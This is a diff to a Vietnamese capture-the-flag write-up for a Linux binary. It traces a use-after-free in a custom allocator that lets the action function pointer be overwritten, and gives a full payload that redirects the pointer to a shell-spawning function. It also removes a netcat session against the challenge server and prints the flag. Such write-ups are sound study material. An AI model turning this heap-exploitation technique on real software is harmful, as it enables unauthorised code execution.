@@ -12,6 +12,8 @@ Kết quả cho thấy đây là file ELF 64-bit, chạy trên Linux. Binary b�
 
 ## - Chạy thử chương trình
 
+<img width="975" height="221" alt="image" src="https://github.com/user-attachments/assets/1cdf96c3-35fa-4e8c-90c1-4a914ef23988" />
+
 Chương trình nhận các lệnh: `load JSON | del KEY | sample HEXWORDS | symbols | run | reset | quit`
 
 (Ở đây hàm quan trọng là `launch_shell()`. Hàm này sẽ gọi shell nếu tham số truyền vào bắt đầu bằng chuỗi `/bin/sh`.)
@@ -20,15 +22,23 @@ Chương trình nhận các lệnh: `load JSON | del KEY | sample HEXWORDS | sym
 
 ## - Xem struct trong file cpp
 
+
+<img width="561" height="331" alt="image" src="https://github.com/user-attachments/assets/c78f5db5-c077-4d73-8685-236eb1fd04e2" />
+
 ```cpp
-struct JsonValue {
-    unsigned int type;      // +0x00
-    unsigned int length;    // +0x04
-    char data[40];          // +0x08
-    JsonValue *child;       // +0x30
-    Action action;          // +0x38
+với cách khai báo nên ta biết được 
+    unsigned int type;      // +0x00 (4 byte) 
+    unsigned int length;    // +0x04 (4 byte) 
+    char data[40];          // +0x08 (40 byte) 
+    JsonValue *child;       // +0x30 (8 byte) 
+    Action action;          // +0x38 
 };
 ```
+
+Ta check chỗ hàm cmd_run và infer_value thấy 
+<img width="855" height="378" alt="image" src="https://github.com/user-attachments/assets/c4936cce-2f3c-4be7-b91d-eb011c364dd7" />
+
+<img width="850" height="350" alt="image" src="https://github.com/user-attachments/assets/434fd260-b3b3-4421-9568-6ccbe2887ee9" />
 
 - `action` : hàm sẽ được gọi khi `run`
 - Khi chạy lệnh `run`, chương trình sẽ gọi: `v->action(v->data);`
@@ -37,41 +47,15 @@ struct JsonValue {
 
 ## - Bug nằm ở hàm delete (ở hàm free)
 
-```cpp
-void cmd_delete(const char *key) {
-    if (!g_model || !g_model->child) {
-        puts("error: no nested object");
-        return;
-    }
-    if (strcmp(g_loaded_key, key) != 0) {
-        puts("error: key not found");
-        return;
-    }
-    value_free(g_model->child);
-    puts("ok: node deleted");
-}
-```
+<img width="801" height="403" alt="image" src="https://github.com/user-attachments/assets/d2a029c8-e3a0-432d-b458-bbd6f54253db" />
+
 
 -> chương trình không set lại: `g_model->child = nullptr` (nên `g_model->child` vẫn trỏ vào vùng nhớ đã free) -> Lỗi UAF
 
 ## - Xem tiếp allocator tự chế
 
-```cpp
-void *value_alloc() {
-    if (g_free_values) {
-        JsonValue *v = g_free_values;
-        g_free_values = g_free_values->child;
-        return v;
-    }
-    return malloc(sizeof(JsonValue));
-}
+<img width="681" height="445" alt="image" src="https://github.com/user-attachments/assets/760ea646-a548-43b1-901d-c0400630decd" />
 
-void value_free(JsonValue *v) {
-    if (!v) return;
-    v->child = g_free_values;
-    g_free_values = v;
-}
-```
 
 - Khi `del a`, object cũ được đưa vào `g_free_values`
 - Sau đó nếu gọi `sample`, chương trình sẽ cấp phát lại đúng chunk vừa bị free
@@ -114,14 +98,6 @@ launch_shell = 0x401510
 
 => payload full : `sample 700000001 68732f6e69622f 0 0 0 0 0 401510`
 
-## - Chạy trên server
-
-```
-$ nc 222.255.138.122 10181
-> load {"a":"x"}
-> del a
-> sample 700000001 68732f6e69622f 0 0 0 0 0 401510
-> run
-$ cat /flag.txt
+## Kết quả 
 flag{baf2be26-a186-451f-9b86-e296c675abd5}
 ```
